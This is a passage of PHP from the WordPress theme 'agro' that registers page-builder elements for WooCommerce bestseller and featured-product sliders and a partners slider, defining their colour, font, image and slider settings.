                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr5',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr6',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro'),
            )
        )));
    }
}
/*******************************/
/* Blog Post Loop
/******************************/
if (!function_exists('agro_woo_bestseller_integrateWithVC')) {
    add_action('vc_before_init', 'agro_woo_bestseller_integrateWithVC');
    function agro_woo_bestseller_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Woo Bestseller Loop', 'agro'),
        'base' => 'agro_woo_bestseller',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Post Style', 'agro'),
                'param_name' => 'style',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Style 1', 'agro') => '1',
                    esc_html__('Style 2', 'agro') => '2',
                )
            ),
            array(
                "type" => "loop",
                "heading" => esc_html__("Post Query", 'agro'),
                "param_name" => "build_query",
                'settings' => array(
                'size' => array( 'hidden' => false, 'value' =>  '' ),
                'order_by' => array( 'value' => 'date' ),
                'post_type' => array( 'value' => 'product', 'hidden' => false)
                ),
                "description" 	=> esc_html__("Create WordPress loop, to populate products from your site.", 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spt',
                'heading' => esc_html__('Section Top Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-top will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spb',
                'heading' => esc_html__('Section Bottom Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-bottom will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            // Post thumb
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Post Image Width', 'agro'),
                'description' => esc_html__('Change post thumbnail image width or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Post Image Height', 'agro'),
                'description' => esc_html__('Change post thumbnail image height or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'fullthumb',
                'heading' => esc_html__('Full Image Size', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the post thumbnail image will be not cropped.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'post_spacer',
                'heading' => esc_html__('Post Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'ptclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'pthclr',
                'heading' => esc_html__('Hover title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'starclr',
                'heading' => esc_html__('Star color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discbg',
                'heading' => esc_html__('Discount background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discclr',
                'heading' => esc_html__('Discount color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'priceclr',
                'heading' => esc_html__('Price sale color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'priceclr2',
                'heading' => esc_html__('Price regular color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr5',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr6',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro'),
            )
        )));
    }
}


/*******************************/
/* Blog Post Loop
/******************************/
if (!function_exists('agro_woo_featured_integrateWithVC')) {
    add_action('vc_before_init', 'agro_woo_featured_integrateWithVC');
    function agro_woo_featured_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Woo Featured Slider', 'agro'),
        'base' => 'agro_woo_featured',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                "type" => "loop",
                "heading" => esc_html__("Post Query", 'agro'),
                "param_name" => "build_query",
                'settings' => array(
                'size' => array( 'hidden' => false, 'value' =>  '' ),
                'order_by' => array( 'value' => 'date' ),
                'post_type' => array( 'value' => 'product', 'hidden' => false)
                ),
                "description" 	=> esc_html__("Create WordPress loop, to populate products from your site.", 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spt',
                'heading' => esc_html__('Section Top Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-top will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spb',
                'heading' => esc_html__('Section Bottom Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-bottom will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Parallax Image', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'pimg',
                        'heading' => esc_html__('Image', 'agro'),
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'width',
                        'heading' => esc_html__('Image width', 'agro'),
                        'description' => esc_html__('Use simple number without ( px or unit).', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'height',
                        'heading' => esc_html__('Image height', 'agro'),
                        'description' => esc_html__('Use simple number without ( px or unit).', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'xpos',
                        'heading' => esc_html__('X axis position', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'ypos',
                        'heading' => esc_html__('Y axis position', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    )
                )
            ),
            // Post thumb
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Post Image Width', 'agro'),
                'description' => esc_html__('Change post thumbnail image width or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Post Image Height', 'agro'),
                'description' => esc_html__('Change post thumbnail image height or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'fullthumb',
                'heading' => esc_html__('Full Image Size', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the post thumbnail image will be not cropped.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_spacer',
                'heading' => esc_html__('Slider General Options', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'speed',
                'heading' => esc_html__('Speed', 'agro'),
                'description' => esc_html__('Use simple number.Default 1200', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'autoplay',
                'heading' => esc_html__('Autoplay?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'dots',
                'heading' => esc_html__('Dots?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_lg_spacer',
                'heading' => esc_html__('Slider Responsive Options ( 1199px )', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgrows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgshow',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 4', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgscroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_md_spacer',
                'heading' => esc_html__('Slider Responsive Options ( 991px )', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'mdrows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'mdshow',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 4', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'mdscroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_sm_spacer',
                'heading' => esc_html__('Slider Responsive Options ( 767px )', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'smrows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'smshow',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 3', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'smscroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 3', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_xs_spacer',
                'heading' => esc_html__('Slider Responsive Options ( 575px )', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'xsrows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'xsshow',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'xsscroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'post_spacer',
                'heading' => esc_html__('Post Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'ptclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'pthclr',
                'heading' => esc_html__('Hover title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'starclr',
                'heading' => esc_html__('Star color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discbg',
                'heading' => esc_html__('Discount background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discclr',
                'heading' => esc_html__('Discount color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'priceclr',
                'heading' => esc_html__('Price sale color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'priceclr2',
                'heading' => esc_html__('Price regular color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr5',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr6',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro'),
            )
        )));
    }
}


/*******************************/
/* partners
/******************************/
if (!function_exists('agro_partners_integrateWithVC')) {
    add_action('vc_before_init', 'agro_partners_integrateWithVC');
    function agro_partners_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Partners Slider', 'agro'),
        'base' => 'agro_partners',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro')
            ),
            array(
                'type' => 'attach_images',
                'param_name' => 'images',
                'heading' => esc_html__('Partners Images', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Partners Images Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Partners Images Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgcount',
                'heading' => esc_html__('LG Image Count', 'agro'),
                'description' => esc_html__('LG : Large Device', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'mdcount',
                'heading' => esc_html__('MD Image Count', 'agro'),
                'description' => esc_html__('MD : Medium Device', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'smcount',
                'heading' => esc_html__('SM Image Count', 'agro'),
                'description' => esc_html__('SM : Small Device', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'xscount',
                'heading' => esc_html__('XS Image Count', 'agro'),
                'description' => esc_html__('XS : X-Small Device', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_spacer',
                'heading' => esc_html__('Slider Options', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'autoplay',
                'heading' => esc_html__('Auto play?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'pauseonhover',
                'heading' => esc_html__('Pause on hover?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'dots',
                'heading' => esc_html__('Dots?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'speed',
                'heading' => esc_html__('Speed', 'agro'),
                'description' => esc_html__('Use simple number.default 1000 (1s).', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
